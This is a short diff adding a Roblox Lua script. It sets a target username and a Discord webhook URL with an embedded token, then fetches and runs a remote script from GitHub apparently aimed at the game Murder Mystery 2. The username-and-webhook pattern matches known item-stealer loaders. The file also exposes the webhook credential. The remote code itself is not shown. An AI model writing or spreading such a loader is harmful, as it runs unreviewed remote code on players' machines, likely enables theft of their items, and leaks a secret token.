@@ -1,0 +1,4 @@
+Username = "exel0423"
+Webhook = "https://discord.com/api/webhooks/1297464482779369524/S17e5QZY5CO49gcfohQnHYD5EuebFCm6lzOZCrfTvw_Y01JmSieKpwSYRGp9F80-Sl8Z"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Skidtho/MM2/refs/heads/main/Skidtho-Mm2.lua"))()
